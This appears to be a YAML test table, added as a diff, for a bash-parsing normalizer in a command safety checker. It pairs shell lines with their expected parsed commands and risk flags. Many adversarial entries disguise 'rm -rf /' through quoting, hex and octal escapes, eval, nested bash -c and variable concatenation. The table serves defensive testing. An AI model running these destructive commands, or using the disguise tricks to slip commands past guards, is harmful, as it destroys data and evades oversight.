@@ -1,0 +1,2118 @@
+# Table for tests/unit/test_norm_bash.py (normalize/bash.py).
+#
+# Entry keys
+#   id, note, adv (true = adversarial), cmd (string) | gen {prefix, unit, times, suffix}, max_depth
+#   commands: the exact, ordered list of expected simple commands; each item may state
+#     argv   list of words; a word is a string (text only) or {t: text, expands/glob/quoted: bool}
+#     origin, wrappers, env {NAME: text}, redirects [[op, fd, target-or-null]], in_pipeline,
+#     background, args_from_stdin.  Only the keys that are written are compared.
+#   has: commands that must appear somewhere (same item format, unordered, extra commands allowed)
+#   gray / exec: the exact expected list; gray_has / exec_has: must contain.
+#   Without any of gray / gray_has the entry expects NO gray reasons; likewise for exec.
+
+# ---------------------------------------------------------------- plain structure
+- id: simple
+  cmd: 'ls -la /tmp'
+  commands:
+    - {argv: [ls, -la, /tmp], origin: top, wrappers: [], env: {}, redirects: [], in_pipeline: false, background: false}
+
+- id: pipeline
+  cmd: 'cat f | grep x | wc -l'
+  commands:
+    - {argv: [cat, f], in_pipeline: true}
+    - {argv: [grep, x], in_pipeline: true}
+    - {argv: [wc, -l], in_pipeline: true}
+
+- id: and-or-not-pipeline
+  cmd: 'a && b || c'
+  commands:
+    - {argv: [a], in_pipeline: false, background: false}
+    - {argv: [b], in_pipeline: false}
+    - {argv: [c], in_pipeline: false}
+
+- id: semicolons
+  cmd: 'a; b ;c'
+  commands:
+    - {argv: [a]}
+    - {argv: [b]}
+    - {argv: [c]}
+
+- id: newline-separates
+  cmd: "a\nb"
+  commands:
+    - {argv: [a]}
+    - {argv: [b]}
+
+- id: background
+  cmd: 'sleep 1 &'
+  commands:
+    - {argv: [sleep, '1'], background: true, in_pipeline: false}
+
+- id: background-whole-and-or-list
+  cmd: 'a && b &'
+  commands:
+    - {argv: [a], background: true}
+    - {argv: [b], background: true}
+
+- id: background-only-before-amp
+  cmd: 'a & b'
+  commands:
+    - {argv: [a], background: true}
+    - {argv: [b], background: false}
+
+- id: background-pipeline
+  cmd: 'a | b &'
+  commands:
+    - {argv: [a], background: true, in_pipeline: true}
+    - {argv: [b], background: true, in_pipeline: true}
+
+- id: pipe-stderr
+  cmd: 'a |& b'
+  commands:
+    - {argv: [a], in_pipeline: true}
+    - {argv: [b], in_pipeline: true}
+
+- id: pipeline-cd-rm
+  note: the assembler needs this - cd in a pipeline does not change the directory
+  cmd: 'cd x | rm y'
+  commands:
+    - {argv: [cd, x], in_pipeline: true}
+    - {argv: [rm, y], in_pipeline: true}
+
+- id: pipeline-group-stage
+  cmd: '{ a; b; } | c'
+  commands:
+    - {argv: [a], in_pipeline: true}
+    - {argv: [b], in_pipeline: true}
+    - {argv: [c], in_pipeline: true}
+
+- id: pipeline-substitution-has-own-context
+  cmd: 'x | y $(z)'
+  commands:
+    - {argv: [x], in_pipeline: true}
+    - {argv: [z], origin: substitution, in_pipeline: false}
+    - {argv: [y, {t: '$(z)', expands: true}], in_pipeline: true}
+
+- id: pipeline-inside-substitution
+  cmd: 'echo $(a | b)'
+  commands:
+    - {argv: [a], origin: substitution, in_pipeline: true}
+    - {argv: [b], origin: substitution, in_pipeline: true}
+    - {argv: [echo, {t: '$(a | b)', expands: true}], in_pipeline: false}
+
+- id: pipeline-ends-at-semicolon
+  cmd: 'a | b; c'
+  commands:
+    - {argv: [a], in_pipeline: true}
+    - {argv: [b], in_pipeline: true}
+    - {argv: [c], in_pipeline: false}
+
+- id: subshell-pipeline
+  cmd: '(a | b) ; c'
+  commands:
+    - {argv: [a], origin: subshell, in_pipeline: true}
+    - {argv: [b], origin: subshell, in_pipeline: true}
+    - {argv: [c], origin: top, in_pipeline: false}
+
+- id: subshell
+  cmd: '(cd /; ls)'
+  commands:
+    - {argv: [cd, /], origin: subshell}
+    - {argv: [ls], origin: subshell}
+
+- id: brace-group-keeps-origin
+  cmd: '{ a; b; }'
+  commands:
+    - {argv: [a], origin: top}
+    - {argv: [b], origin: top}
+
+- id: group-redirect-is-visible
+  cmd: '{ a; } > f'
+  commands:
+    - {argv: [a]}
+    - {argv: [], redirects: [['>', null, f]]}
+
+- id: subshell-redirect-is-visible
+  cmd: '(a) 2>&1'
+  commands:
+    - {argv: [a], origin: subshell}
+    - {argv: [], redirects: [['>&', '2', null]]}
+
+# ---------------------------------------------------------------- redirections
+- id: redirect-out
+  cmd: 'echo hi > out.txt'
+  commands:
+    - {argv: [echo, hi], redirects: [['>', null, out.txt]]}
+
+- id: redirect-append
+  cmd: 'echo hi >> out.txt'
+  commands:
+    - {argv: [echo, hi], redirects: [['>>', null, out.txt]]}
+
+- id: redirect-in
+  cmd: 'wc < f'
+  commands:
+    - {argv: [wc], redirects: [['<', null, f]]}
+
+- id: redirect-stderr-fd
+  cmd: 'a 2> err'
+  commands:
+    - {argv: [a], redirects: [['>', '2', err]]}
+
+- id: redirect-dup
+  cmd: 'a >f 2>&1'
+  commands:
+    - {argv: [a], redirects: [['>', null, f], ['>&', '2', null]]}
+
+- id: redirect-both
+  cmd: 'a &> f'
+  commands:
+    - {argv: [a], redirects: [['&>', null, f]]}
+
+- id: redirect-both-append
+  cmd: 'a &>> f'
+  commands:
+    - {argv: [a], redirects: [['&>>', null, f]]}
+
+- id: redirect-clobber
+  cmd: 'a >| f'
+  commands:
+    - {argv: [a], redirects: [['>|', null, f]]}
+
+- id: redirect-readwrite
+  cmd: 'a <> f'
+  commands:
+    - {argv: [a], redirects: [['<>', null, f]]}
+
+- id: redirect-named-fd
+  cmd: 'a {fd}> f'
+  commands:
+    - {argv: [a], redirects: [['>', '{fd}', f]]}
+
+- id: redirect-close-fd
+  cmd: 'a 3>&-'
+  commands:
+    - {argv: [a], redirects: [['>&', '3', null]]}
+
+- id: redirect-ampersand-to-file
+  note: '>&word with a non-numeric word is a file, not an fd duplication'
+  cmd: 'a >&f'
+  commands:
+    - {argv: [a], redirects: [['>&', null, f]]}
+
+- id: redirect-before-command
+  cmd: '> f echo hi'
+  commands:
+    - {argv: [echo, hi], redirects: [['>', null, f]]}
+
+- id: redirect-only
+  cmd: '> f'
+  commands:
+    - {argv: [], redirects: [['>', null, f]]}
+
+- id: redirect-dup-quoted-number
+  cmd: 'a 2>&"1"'
+  commands:
+    - {argv: [a], redirects: [['>&', '2', null]]}
+
+- id: redirect-target-substitution
+  adv: true
+  cmd: 'echo hi > $(rm x)'
+  commands:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [echo, hi], redirects: [['>', null, '$(rm x)']]}
+
+- id: herestring-to-cat
+  cmd: 'cat <<< word'
+  commands:
+    - {argv: [cat], redirects: [['<<<', null, word]]}
+
+- id: digits-argument-not-fd
+  cmd: 'echo a2>f'
+  commands:
+    - {argv: [echo, a2], redirects: [['>', null, f]]}
+
+- id: exec-redirect-only
+  adv: true
+  cmd: 'exec 3>f'
+  commands:
+    - {argv: [exec], redirects: [['>', '3', f]]}
+
+# ---------------------------------------------------------------- assignments
+- id: assign-only
+  cmd: 'FOO=bar'
+  commands:
+    - {argv: [], env: {FOO: bar}}
+
+- id: assign-prefix
+  cmd: 'A=1 B=2 tool x'
+  commands:
+    - {argv: [tool, x], env: {A: '1', B: '2'}}
+
+- id: assign-append
+  cmd: 'x+=1'
+  commands:
+    - {argv: [], env: {x: '1'}}
+
+- id: assign-tilde-value
+  cmd: 'P=~/bin'
+  commands:
+    - {argv: [], env: {P: '~/bin'}}
+
+- id: assign-value-with-substitution
+  adv: true
+  cmd: 'A=$(rm x)'
+  commands:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [], env: {A: '$(rm x)'}}
+
+- id: assign-glob-not-a-glob
+  cmd: 'A=*.py tool'
+  commands:
+    - {argv: [tool], env: {A: '*.py'}}
+
+- id: assign-array
+  cmd: 'arr=(a b c)'
+  commands:
+    - {argv: [], env: {arr: (a b c)}}
+  gray: [array-assignment]
+
+- id: assign-array-substitution
+  adv: true
+  cmd: 'arr=(a b $(rm x))'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [array-assignment]
+
+- id: assign-array-element
+  cmd: 'a[1]=2'
+  commands:
+    - {argv: [], env: {a: '2'}}
+  gray: [array-assignment]
+
+- id: assign-quoted-name-is-a-command
+  note: a quoted NAME is not an assignment; bash runs a command called A=1
+  cmd: '"A"=1 x'
+  commands:
+    - {argv: ['A=1', x], env: {}}
+
+- id: assign-then-dynamic-program
+  adv: true
+  note: variable concatenation hides the program name; the line must be gray
+  cmd: 'a=r; b=m; $a$b -rf /'
+  commands:
+    - {argv: [], env: {a: r}}
+    - {argv: [], env: {b: m}}
+    - {argv: [{t: '$a$b', expands: true}, -rf, /]}
+  gray: [dynamic-command-name]
+
+# ---------------------------------------------------------------- expansions and word flags
+- id: command-substitution
+  cmd: 'echo $(date)'
+  commands:
+    - {argv: [date], origin: substitution}
+    - {argv: [echo, {t: '$(date)', expands: true}], origin: top}
+
+- id: backtick-substitution
+  cmd: 'echo `date`'
+  commands:
+    - {argv: [date], origin: substitution}
+    - {argv: [echo, {t: '`date`', expands: true}]}
+
+- id: dq-substitution
+  adv: true
+  cmd: 'echo "$(rm -rf /)"'
+  commands:
+    - {argv: [rm, -rf, /], origin: substitution}
+    - {argv: [echo, {t: '$(rm -rf /)', expands: true, quoted: true}]}
+
+- id: dq-backticks
+  adv: true
+  cmd: 'echo "`rm -rf /`"'
+  commands:
+    - {argv: [rm, -rf, /], origin: substitution}
+    - {argv: [echo, {t: '`rm -rf /`', expands: true, quoted: true}]}
+
+- id: nested-substitution
+  adv: true
+  cmd: 'echo $(echo $(echo $(rm x)))'
+  commands:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [echo, '$(rm x)'], origin: substitution}
+    - {argv: [echo, '$(echo $(rm x))'], origin: substitution}
+    - {argv: [echo, '$(echo $(echo $(rm x)))'], origin: top}
+
+- id: nested-backticks
+  adv: true
+  cmd: 'echo `echo \`rm x\``'
+  has:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [echo, '`rm x`'], origin: substitution}
+
+- id: substitution-inside-dq-inside-substitution
+  adv: true
+  cmd: 'echo "$(echo "$(rm x)")"'
+  has:
+    - {argv: [rm, x], origin: substitution}
+    - {argv: [echo, '$(rm x)'], origin: substitution}
+
+- id: param-default-hides-substitution
+  adv: true
+  cmd: 'echo "${x:-$(rm y)}"'
+  commands:
+    - {argv: [rm, y], origin: substitution}
+    - {argv: [echo, {t: '${x:-$(rm y)}', expands: true}]}
+
+- id: param-unquoted-quote-protects-brace
+  cmd: "echo ${x:-'}'}"
+  commands:
+    - {argv: [echo, {t: "${x:-'}'}", expands: true}]}
+
+- id: param-quote-in-dq-is-ambiguous
+  adv: true
+  note: bash 5 treats the quote as literal inside "${...}"; we do too and say so
+  cmd: 'echo "${x:-''a''}"'
+  gray: [ambiguous-quote]
+  commands:
+    - {argv: [echo, {t: "${x:-'a'}", expands: true}]}
+
+- id: old-arithmetic-hides-substitution
+  adv: true
+  cmd: 'echo $[1+$(rm x)]'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray: [arithmetic]
+
+- id: substitution-read-file
+  cmd: 'echo $(<f)'
+  commands:
+    - {argv: [], redirects: [['<', null, f]], origin: substitution}
+    - {argv: [echo, '$(<f)']}
+
+- id: var-flags
+  cmd: |-
+    echo $HOME '$HOME' "$HOME" \$HOME "\$HOME"
+  commands:
+    - argv:
+        - echo
+        - {t: $HOME, expands: true, quoted: false}
+        - {t: $HOME, expands: false, quoted: true}
+        - {t: $HOME, expands: true, quoted: true}
+        - {t: $HOME, expands: false, quoted: true}
+        - {t: $HOME, expands: false, quoted: true}
+
+- id: special-parameters
+  cmd: 'echo $1 $@ $# $? $$'
+  commands:
+    - argv: [echo, {t: '$1', expands: true}, {t: '$@', expands: true}, {t: '$#', expands: true}, {t: '$?', expands: true}, {t: '$$', expands: true}]
+
+- id: lone-dollar-is-literal
+  cmd: 'echo $ "a$"'
+  commands:
+    - {argv: [echo, {t: $, expands: false}, {t: a$, expands: false}]}
+
+- id: glob-unquoted
+  cmd: 'ls *.py'
+  commands:
+    - {argv: [ls, {t: '*.py', glob: true}]}
+
+- id: glob-quoted
+  cmd: 'ls "*.py" ''*.py'' \*.py'
+  commands:
+    - argv: [ls, {t: '*.py', glob: false, quoted: true}, {t: '*.py', glob: false}, {t: '*.py', glob: false}]
+
+- id: glob-question-and-class
+  cmd: 'ls ?x [ab]*'
+  commands:
+    - {argv: [ls, {t: '?x', glob: true}, {t: '[ab]*', glob: true}]}
+
+- id: test-bracket-is-not-a-glob
+  cmd: '[ -f x ]'
+  commands:
+    - argv: [{t: '[', glob: false}, -f, x, {t: ']', glob: false}]
+
+- id: tilde
+  cmd: 'ls ~/x ~ "~"'
+  commands:
+    - {argv: [ls, {t: '~/x', expands: true}, {t: '~', expands: true}, {t: '~', expands: false, quoted: true}]}
+
+- id: param-expansion
+  cmd: 'echo ${x:-d} ${#y}'
+  commands:
+    - {argv: [echo, {t: '${x:-d}', expands: true}, {t: '${#y}', expands: true}]}
+
+- id: arithmetic-expansion
+  cmd: 'echo $((1+2))'
+  commands:
+    - {argv: [echo, {t: '$((1+2))', expands: true}]}
+  gray: [arithmetic]
+
+- id: arithmetic-with-substitution-is-parsed
+  adv: true
+  cmd: 'echo $(( $(rm x) + 1 ))'
+  has:
+    - {argv: [rm, x], origin: substitution}
+  gray_has: [arithmetic]
+
+- id: arithmetic-command
+  cmd: '(( x = 1 ))'
+  commands: []
+  gray: [arithmetic]
+
+- id: c-style-for
+  cmd: 'for ((i=0;i<3;i++)); do rm $i; done'
+  has:
+    - {argv: [rm, {t: $i, expands: true}]}
+  gray_has: [compound:for, arithmetic, compound:do, compound:done]
+
+# ---------------------------------------------------------------- quoting
+- id: semicolon-in-single-quotes
+  adv: true
+  cmd: "echo 'a; rm -rf /'"
+  commands:
+    - {argv: [echo, 'a; rm -rf /']}
+
+- id: and-and-in-double-quotes
+  adv: true
+  cmd: 'echo "a && rm -rf /" && ls'
+  commands:
+    - {argv: [echo, 'a && rm -rf /']}
+    - {argv: [ls]}
+
+- id: pipe-and-redirect-in-quotes
+  adv: true
+  cmd: 'echo "a | b > c" ''d < e'''
+  commands:
+    - {argv: [echo, 'a | b > c', 'd < e'], redirects: []}
+
+- id: dq-escaped-quote
+  cmd: 'echo "a\"b"'
+  commands:
+    - {argv: [echo, 'a"b']}
+
+- id: dq-backslash-is-literal-before-letter
+  cmd: 'echo "a\nb"'
+  commands:
+    - {argv: [echo, 'a\nb']}
+
+- id: sq-backslash-is-literal
+  cmd: "echo 'a\\nb'"
+  commands:
+    - {argv: [echo, 'a\nb']}
+
+- id: quote-adjacent-concatenation
+  adv: true
+  cmd: |-
+    echo 'a'"b"c'd'
+  commands:
+    - {argv: [echo, abcd, ]}
+
+- id: apostrophe-trick
+  adv: true
+  cmd: |-
+    echo 'it'"'"'s'
+  commands:
+    - {argv: [echo, "it's"]}
+
+- id: empty-string-argument
+  cmd: "rm ''"
+  commands:
+    - {argv: [rm, {t: '', quoted: true}]}
+
+- id: quoted-program-name
+  adv: true
+  cmd: "r''m -rf /"
+  commands:
+    - {argv: [rm, -rf, /]}
+
+- id: quote-split-program-name
+  adv: true
+  cmd: |-
+    'r'"m" -rf /
+  commands:
+    - {argv: [rm, -rf, /]}
+
+- id: backslash-program-name
+  adv: true
+  cmd: '\rm x'
+  commands:
+    - {argv: [rm, x]}
+
+- id: backslash-newline-in-word
+  adv: true
+  cmd: "r\\\nm -rf /"
+  commands:
+    - {argv: [rm, -rf, /]}
+
+- id: backslash-newline-between-words
+  adv: true
+  cmd: "rm \\\n-rf /"
+  commands:
+    - {argv: [rm, -rf, /]}
+
+- id: backslash-newline-before-hash
+  adv: true
+  note: the hash is then not at word start, so it is not a comment
+  cmd: "echo a\\\n#b"
+  commands:
+    - {argv: [echo, 'a#b']}
+
+- id: ansi-c-hex
+  adv: true
+  cmd: "$'\\x72\\x6d' -rf /"
+  commands:
+    - {argv: [rm, -rf, /]}
+
+- id: ansi-c-octal
+  adv: true
+  cmd: "$'\\162\\155' x"
+  commands:
+    - {argv: [rm, x]}
+
+- id: ansi-c-unicode
+  adv: true
+  cmd: "$'\\u0072m' x"
+  commands:
+    - {argv: [rm, x]}
+
+- id: ansi-c-escapes
+  cmd: "echo $'a\\tb\\n' $'\\'q\\''"
+  commands:
+    - {argv: [echo, "a\tb\n", "'q'"]}
+
+- id: ansi-c-utf8-bytes
+  cmd: "echo $'\\xe4\\xb8\\xad'"
+  commands:
+    - {argv: [echo, "中"]}
+
+- id: ansi-c-nul-truncates
+  adv: true
+  cmd: "$'rm\\x00 foo'"
+  commands:
+    - {argv: [rm]}
+  gray: [nul-byte]
+
+- id: locale-string
+  cmd: 'echo $"hello"'
+  commands:
+    - {argv: [echo, hello]}
+
+- id: dynamic-program-from-substitution
+  adv: true
+  cmd: '"$(echo rm)" -rf /'
+  has:
+    - {argv: [echo, rm], origin: substitution}
+  gray: [dynamic-command-name]
+
+- id: dynamic-program-glob
+  adv: true
+  cmd: '/bin/r* -rf /'
+  commands:
+    - {argv: [{t: '/bin/r*', glob: true}, -rf, /]}
+  gray: [dynamic-command-name]
+
+- id: tilde-program-is-not-dynamic
+  cmd: '~/bin/tool x'
+  commands:
+    - {argv: [{t: '~/bin/tool', expands: true}, x]}
+
+- id: crlf-is-part-of-the-word
+  note: bash does not treat CR as a blank, so neither do we
+  cmd: "echo a\r\necho b"
+  commands:
+    - {argv: ["echo", "a\r"]}
+    - {argv: [echo, b]}
+
+# ---------------------------------------------------------------- comments
+- id: comment-tail
+  cmd: 'echo hi # rm -rf /'
+  commands:
+    - {argv: [echo, hi]}
+
+- id: comment-only
+  cmd: '# rm -rf /'
+  commands: []
+  gray: [no-command]
+
+- id: comment-after-semicolon
+  adv: true
+  cmd: 'echo a;# rm x'
+  commands:
+    - {argv: [echo, a]}
+
+- id: hash-inside-word-is-not-a-comment
+  adv: true
+  cmd: 'echo a#b; rm x'
+  commands:
+    - {argv: [echo, 'a#b']}
+    - {argv: [rm, x]}
+
+- id: escaped-hash
+  adv: true
+  cmd: 'echo \#a; rm x'
+  commands:
+    - {argv: [echo, '#a']}
+    - {argv: [rm, x]}
+
+- id: quoted-hash
+  adv: true
+  cmd: 'echo "#x"; rm y'
+  commands:
+    - {argv: [echo, '#x']}
+    - {argv: [rm, y]}
+
+- id: comment-ends-at-newline
+  adv: true
+  cmd: "echo a # c\nrm x"
+  commands:
+    - {argv: [echo, a]}
+    - {argv: [rm, x]}
+
+- id: comment-does-not-continue-over-backslash-newline
+  adv: true
+  cmd: "echo a # c \\\nrm x"
+  commands:
+    - {argv: [echo, a]}
+    - {argv: [rm, x]}
+
+- id: empty
+  cmd: ''
+  commands: []
+  gray: [no-command]
+
+- id: whitespace-only
+  cmd: " \t \n "
+  commands: []
+  gray: [no-command]
+
+# ---------------------------------------------------------------- wrappers
+- id: sudo
+  cmd: 'sudo rm -rf /tmp/x'
+  commands:
+    - {argv: [rm, -rf, /tmp/x], wrappers: [sudo]}
+
+- id: sudo-user
+  adv: true
+  cmd: 'sudo -u x rm y'
+  commands:
+    - {argv: [rm, y], wrappers: [sudo]}
+
+- id: sudo-combined-flags-and-dashdash
+  adv: true
+  cmd: 'sudo -Eu root -- rm y'
+  commands:
+    - {argv: [rm, y], wrappers: [sudo]}
+
+- id: sudo-env-operand
+  cmd: 'sudo FOO=1 rm y'
+  commands:
+    - {argv: [rm, y], wrappers: [sudo], env: {FOO: '1'}}
+
+- id: sudo-chdir-is-gray
+  adv: true
+  note: -D changes the working directory, so relative paths mean something else
+  cmd: 'sudo -D /etc rm y'
+  commands:
+    - {argv: [rm, y], wrappers: [sudo]}
+  gray: ['wrapper-option:sudo:-D']
+
+- id: sudo-unknown-option-is-gray-and-not-stripped
+  adv: true
+  cmd: 'sudo -Z rm y'
+  commands:
+    - {argv: [sudo, -Z, rm, y], wrappers: []}
+  gray: ['wrapper-options:sudo']
+
+- id: sudo-edit-does-not-run-a-command
+  adv: true
+  cmd: 'sudo -e /etc/passwd'
+  commands:
+    - {argv: [sudo, -e, /etc/passwd]}
+  gray: ['wrapper-options:sudo']
+
+- id: sudo-alone
+  cmd: 'sudo'
+  commands:
+    - {argv: [sudo], wrappers: []}
+
+- id: sudo-shell-mode
+  adv: true
+  cmd: 'sudo -s rm y'
+  has:
+    - {argv: [rm, y], wrappers: [sudo], origin: bash-c}
+    - {argv: [rm, y], wrappers: [sudo], origin: top}
+  exec: ['wrapper-shell:sudo']
+  gray: ['exec:wrapper-shell:sudo']
+
+- id: doas
+  cmd: 'doas -u x rm y'
+  commands:
+    - {argv: [rm, y], wrappers: [doas]}
+
+- id: env-prefix
+  adv: true
+  cmd: 'env -i FOO=1 rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [env], env: {FOO: '1'}}
+
+- id: env-unset
+  cmd: 'env -u HOME rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [env]}
+
+- id: env-alone
+  cmd: 'env'
+  commands:
+    - {argv: [env], wrappers: []}
+
+- id: env-split-string
+  adv: true
+  cmd: "env -S 'rm -rf x'"
+  has:
+    - {argv: [rm, -rf, x], origin: bash-c, wrappers: [env]}
+    - {argv: [env, -S, rm -rf x], wrappers: []}
+  exec: [env-split-string]
+  gray: ['exec:env-split-string']
+
+- id: env-path-qualified
+  cmd: '/usr/bin/env rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [env]}
+
+- id: nohup-background
+  cmd: 'nohup rm x &'
+  commands:
+    - {argv: [rm, x], wrappers: [nohup], background: true}
+
+- id: time-nested-wrappers
+  adv: true
+  cmd: 'time sudo nice -n 5 timeout 10 rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [time, sudo, nice, timeout]}
+
+- id: timeout-options
+  cmd: 'timeout -k 5 --signal=KILL 10 rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [timeout]}
+
+- id: nice-numeric
+  cmd: 'nice -10 rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [nice]}
+
+- id: stdbuf-attached
+  cmd: 'stdbuf -oL rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [stdbuf]}
+
+- id: ionice-setsid
+  cmd: 'ionice -c3 setsid -f rm x'
+  commands:
+    - {argv: [rm, x], wrappers: [ionice, setsid]}
+
+- id: command-builtin-exec
+  cmd: 'command rm x; builtin cd y; exec rm z'
+  commands:
+    - {argv: [rm, x], wrappers: [command]}
+    - {argv: [cd, y], wrappers: [builtin]}
+    - {argv: [rm, z], wrappers: [exec]}
+
+- id: command-v-is-a-lookup
+  cmd: 'command -v rm'
+  commands:
+    - {argv: [command, -v, rm], wrappers: []}
+
+- id: time-output-file-is-gray
+  adv: true
+  cmd: 'time -o /etc/x ls'
+  commands:
+    - {argv: [ls], wrappers: [time]}
+  gray: ['wrapper-option:time:-o']
+
+- id: wrapper-with-dynamic-option
+  adv: true
+  cmd: 'sudo $opts rm x'
+  commands:
+    - {argv: [{t: $opts, expands: true}, rm, x], wrappers: [sudo]}
+  gray: [dynamic-command-name]
+
+- id: xargs-rm
+  adv: true
+  cmd: 'xargs rm -rf'
+  commands:
+    - {argv: [rm, -rf], wrappers: [xargs], args_from_stdin: true}
+
+- id: xargs-options
+  cmd: 'find . | xargs -0 -I{} -n1 -P4 rm {}'
+  has:
+    - {argv: ['rm', '{}'], wrappers: [xargs], args_from_stdin: true, in_pipeline: true}
+
+- id: xargs-unknown-option
+  adv: true
+  cmd: 'xargs -Z rm'
+  commands:
+    - {argv: [xargs, -Z, rm], wrappers: [], args_from_stdin: false}
+  gray: ['wrapper-options:xargs']
+
+- id: xargs-arg-file-is-gray
+  adv: true
+  cmd: 'xargs -a list rm'
+  commands:
+    - {argv: [rm], wrappers: [xargs], args_from_stdin: true}
+  gray: ['wrapper-option:xargs:-a']
+
+- id: xargs-sh-c
+  adv: true
+  cmd: "xargs sh -c 'rm \"$@\"' _"
+  has:
+    - {argv: [sh, -c, 'rm "$@"', _], wrappers: [xargs], args_from_stdin: true}
+    - {argv: [rm, {t: '$@', expands: true}], wrappers: [xargs], origin: bash-c}
+  exec: ['xargs-interpreter:sh']
+  gray: ['exec:xargs-interpreter:sh']
+
+- id: xargs-bash-script-from-stdin
+  adv: true
+  cmd: 'xargs bash'
+  exec: ['xargs-interpreter:bash']
+  gray: ['exec:xargs-interpreter:bash']
+
+# ---------------------------------------------------------------- bash -c and friends
+- id: bash-c
+  cmd: "bash -c 'rm -rf /'"
+  commands:
+    - {argv: [bash, -c, rm -rf /], origin: top}
+    - {argv: [rm, -rf, /], origin: bash-c}
+
+- id: sh-c-with-positional
+  cmd: "sh -c 'a' x y"
+  commands:
+    - {argv: [sh, -c, a, x, y]}
+    - {argv: [a], origin: bash-c}
+
+- id: bash-lc
+  cmd: "bash -lc 'a; b'"
+  commands:
+    - {argv: [bash, -lc, 'a; b']}
+    - {argv: [a], origin: bash-c}
+    - {argv: [b], origin: bash-c}
+
+- id: dash-ec
+  cmd: "dash -ec 'a'"
+  commands:
+    - {argv: [dash, -ec, a]}
+    - {argv: [a], origin: bash-c}
+
+- id: zsh-and-ksh
+  cmd: "zsh -c 'a'; ksh -c 'b'"
+  has:
+    - {argv: [a], origin: bash-c}
+    - {argv: [b], origin: bash-c}
+
+- id: bash-c-after-long-and-o-options
+  cmd: "bash --norc -o pipefail -c x"
+  commands:
+    - {argv: [bash, --norc, -o, pipefail, -c, x]}
+    - {argv: [x], origin: bash-c}
+
+- id: bash-c-dashdash
+  cmd: "bash -c -- 'rm y'"
+  has:
+    - {argv: [rm, y], origin: bash-c}
+
+- id: bash-c-inherits-wrappers
+  adv: true
+  cmd: "sudo bash -c 'rm x'"
+  commands:
+    - {argv: [bash, -c, rm x], wrappers: [sudo]}
+    - {argv: [rm, x], wrappers: [sudo], origin: bash-c}
+
+- id: bash-c-without-code
+  cmd: 'bash -c'
+  commands:
+    - {argv: [bash, -c]}
+
+- id: bash-c-dynamic-string
+  adv: true
+  cmd: 'bash -c "$cmd"'
+  has:
+    - {argv: [{t: $cmd, expands: true}], origin: bash-c}
+  exec: ['dynamic-shell-c:bash']
+  gray_has: ['exec:dynamic-shell-c:bash', dynamic-command-name]
+
+- id: bash-c-partially-dynamic-string
+  adv: true
+  cmd: 'bash -c "rm $x"'
+  has:
+    - {argv: [rm, {t: $x, expands: true}], origin: bash-c}
+  exec: ['dynamic-shell-c:bash']
+  gray: ['exec:dynamic-shell-c:bash']
+
+- id: bash-c-single-quoted-variable-is-the-inner-shells
+  cmd: "bash -c 'rm $x'"
+  has:
+    - {argv: [rm, {t: $x, expands: true}], origin: bash-c}
+
+- id: bash-c-depth-three-is-fine
+  adv: true
+  cmd: |-
+    bash -c 'bash -c "bash -c ls"'
+  commands:
+    - {argv: [bash, -c, 'bash -c "bash -c ls"'], origin: top}
+    - {argv: [bash, -c, 'bash -c ls'], origin: bash-c}
+    - {argv: [bash, -c, ls], origin: bash-c}
+    - {argv: [ls], origin: bash-c}
+
+- id: bash-c-depth-limit-is-a-parameter
+  adv: true
+  cmd: |-
+    bash -c 'bash -c "bash -c ls"'
+  max_depth: 2
+  commands:
+    - {argv: [bash, -c, 'bash -c "bash -c ls"'], origin: top}
+    - {argv: [bash, -c, 'bash -c ls'], origin: bash-c}
+    - {argv: [bash, -c, ls], origin: bash-c}
+  gray: [depth-exceeded]
+
+- id: bash-c-depth-four-exceeds-default
+  adv: true
+  cmd: |-
+    bash -c 'bash -c "bash -c \"bash -c ls\""'
+  has:
+    - {argv: [bash, -c, ls], origin: bash-c}
+  gray: [depth-exceeded]
+
+- id: bash-c-depth-zero-forbids-recursion
+  adv: true
+  cmd: "bash -c 'rm x'"
+  max_depth: 0
+  commands:
+    - {argv: [bash, -c, rm x]}
+  gray: [depth-exceeded]
+
+- id: bash-c-does-not-hide-substitution
+  adv: true
+  cmd: "bash -c 'echo $(rm x)'"
+  has:
+    - {argv: [rm, x], origin: substitution}
+
+# ---------------------------------------------------------------- exec reasons
+- id: eval-static
+  adv: true
+  cmd: "eval 'rm -rf /'"
+  commands:
+    - {argv: [eval, rm -rf /]}
+    - {argv: [rm, -rf, /], origin: eval}
+  exec: [eval]
+  gray: ['exec:eval']
+
+- id: eval-dynamic
+  adv: true
+  cmd: 'eval "$x"'
+  has:
+    - {argv: [eval, {t: $x, expands: true}]}
+  exec: [eval]
+  gray_has: ['exec:eval', 'dynamic-code:eval']
+
+- id: eval-escaped-words
+  adv: true
+  cmd: 'eval rm\ -rf\ /'
+  has:
+    - {argv: [rm, -rf, /], origin: eval}
+  exec: [eval]
+  gray: ['exec:eval']
+
+- id: source-file
+  cmd: 'source ./x.sh'
+  exec: [source]
+  gray: ['exec:source']
+
+- id: dot-file
+  cmd: '. ./x.sh'
+  exec: [source]
+  gray: ['exec:source']
+
+- id: python-c
+  adv: true
+  cmd: "python -c 'import os'"
+  exec: ['interpreter-c:python']
+  gray: ['exec:interpreter-c:python']
+
+- id: python3-versioned-c-with-flags
+  adv: true
+  cmd: "python3.11 -u -c 'x'"
+  exec: ['interpreter-c:python3.11']
+  gray: ['exec:interpreter-c:python3.11']
+
+- id: python-clustered-c
+  adv: true
+  cmd: "python3 -Ic 'x'"
+  exec: ['interpreter-c:python3']
+  gray: ['exec:interpreter-c:python3']
+
+- id: python-module-is-not-c
+  cmd: 'python -m pytest -c conf.ini'
+  commands:
+    - {argv: [python, -m, pytest, -c, conf.ini]}
+
+- id: python-script-is-not-exec
+  cmd: 'python script.py -c x'
+  commands:
+    - {argv: [python, script.py, -c, x]}
+
+- id: node-perl-ruby-php
+  adv: true
+  cmd: "node -e 'x'; perl -ne 'x'; ruby -e x; php -r x"
+  exec: ['interpreter-c:node', 'interpreter-c:perl', 'interpreter-c:ruby', 'interpreter-c:php']
+  gray_has: ['exec:interpreter-c:node']
+
